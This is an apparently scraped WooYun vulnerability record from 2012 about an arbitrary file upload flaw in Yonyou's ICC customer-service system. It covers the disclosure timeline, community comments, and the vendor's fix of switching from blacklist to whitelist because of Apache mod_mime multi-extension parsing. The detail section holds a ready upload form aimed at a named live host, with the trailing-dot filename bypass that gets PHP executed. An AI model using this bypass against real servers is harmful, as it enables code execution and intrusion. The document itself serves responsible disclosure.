{"id": 18930, "wybug_id": "wooyun-2012-07960", "wybug_title": "再再暴用友ICC网站客服系统任意文件上传漏洞", "wybug_corp": "用友软件", "wybug_author": "鬼哥", "wybug_date": "2012-06-07 00:15", "wybug_open_date": "2012-07-22 00:15", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传", "用友"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-22：\t细节向公众公开  简要描述： 再再暴用友ICC网站客服系统任意文件上传漏洞，看了一下上一个漏洞：http://www.wooyun.org/bugs/wooyun-2010-06749，发现可以饶过官方修复。 详细说明：  测试多个网站均存在漏洞。/home/ecccs/web/5107/upload/screenImagesSave.php具体自己看源码这里直接给出利用代码。<form enctype=\"multipart/form-data\" method=\"post\" action=\"http://icc.5107.cn/5107/upload/screenImagesSave.php?filename=jpg.php.\"><input type=\"file\" name=\"file\"><input type=\"submit\" name=\"up\" value=\"上传\"></form>上一个是jpg.php 这个是只要在jpg.php后面加个.那么 上传后一样可以解析http://xxx.com/xxx.php.  这样一样可以解析为 php 的。测试了：http://icc.5107.cn/   漏洞证明：  http://icc.5107.cn/data/guige.txt\n\n   修复方案：  你们懂得！   版权声明：转载请注明来源 鬼哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-06-07 11:22 厂商回复： 非常感谢鬼哥@乌云提交的这个问题，让我们发现文件上传的处理逻辑存在的盲点，目前导致此问题的原因已经查明，研发人员正在加紧修复，将采用更加安全的方式处理文件上传，我们会尽快修复所有受此问题影响的客户系统。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-07 09:02 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  帅得爆表啊。。俨然针对该软件的APT。    \n     2012-06-07 12:55 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  用友应该关注安全，重视测试吧,否则很影响销售的吧    \n     2012-06-07 13:21 |    \t\t用友软件(乌云厂商)\t\t \n  @possible 非常感谢您的宝贵意见，我们也一直在努力提升产品的安全性，也感谢如您一般众多安全研究者对我们的产品的关注和产品安全性提升的帮助，努力做出好的产品、安全的产品一直是我们努力的目标。    \n     2012-06-07 13:39 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @用友软件 我只是胡言乱语 厂商莫怪   其实厂商的态度得到了几乎所有的白帽子的佩服，期待用友更多的安全产品问世    \n     2012-06-07 14:54 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  哈，这个“再再”是亮点。支持！厂商的响应速度也赞一个～     \n     2012-06-27 13:10 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  挺好呀 不会是黑名单判断吧？    \n     2012-06-27 15:32 |    \t\t用友软件(乌云厂商)\t\t \n  @possible  文件名后面加点号绕过了验证的问题目前已经修复。我们发现了ICC处理多扩展名文件上传处理的盲区，我们尊重安全研究者的成果，也有义务给研究者提交的问题的修复进度的反馈，我们同样乐于与各位白帽子分享我们的发现，让我们共同提高。 1-原的代码处理上传逻辑由原黑名单式修改为白名单式，仅允许特定类型文件上传； 2-关于文件名加点绕过原验证机制并被作为php脚本解释的原因我们认为是由于apache 的mod_mime处理模块处理多扩展名文件机制导致的，详细描述在Apache官方文档 Apache Module mod_mime 章 Files with Multiple Extensions节，从文档描述分析除了以\".\"结尾的文件名还有多种扩展名可以越过原黑名单式的扩展名检测机制并作为PHP脚本运行，基于这些原因，我们做了第1步的变更。 目前此问题已修复，并为所有受此问题影响的客户修复系统。 感谢各位安全研究者对ICC产品安全性提升的关注和帮助，我们也会与安全社区和安全研究人员密切合作，努力做出好的、安全的软件，为客户创造最大价值。    \n     2012-06-27 15:49 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @用友软件 额 用友的态度真好 赞赞赞...上传 其实白名单+重命名+服务器及时打补丁（配置没有问题）就可以了吧（也许我说的不全 等大神补充）至少我还没绕过去 呵呵    \n     2012-06-27 15:53 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @用友软件 顺便说一下 我就是打酱油的 随便问问 呵呵 厂商可不要把我加入黑名单 以后不收录我呀 以后再也不说你了 呵呵    \n     2012-07-22 01:47 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @用友软件 ...我错了...发了个你们的洞结果引出这么多东西    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}